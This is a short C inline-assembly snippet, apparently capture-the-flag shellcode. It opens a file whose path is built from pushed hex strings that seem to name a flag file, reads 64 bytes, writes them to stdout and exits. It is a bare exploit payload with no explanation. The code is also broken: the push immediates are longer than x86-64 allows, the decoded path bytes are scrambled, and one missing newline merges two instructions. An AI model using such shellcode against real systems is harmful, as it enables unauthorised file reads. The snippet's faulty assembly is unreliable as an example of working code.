
__asm__(
    ".global _run\n"
    "_run:\n"

    "push 0x00676e6f6f6f6f6f6f\n"
    "push 0x6c5f73695f656d616e5f67616c662f63\n"
    "push 0x697361625f7368656c6c2f656d6f682f\n"
    "mov rdi, rsp\n"
    "xor rsi, rsi\n"
    "xor rdx, rdx\n"
    "mov rax, 2\n"
    "syscall\n"
    "\n"

    "mov rdi, rax\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x40\n"
    "mov rdx, 0x40\n"
    "mov rax, 0x0\n"
    "syscall\n"
    "\n"
    "mov rdi, 1\n"
    "mov rax, 0x1\n"
    "syscall\n"
    "\n"
    "xor rdi, rdi"
    "mov rax, 0x3c\n"
    "syscall\n"

);

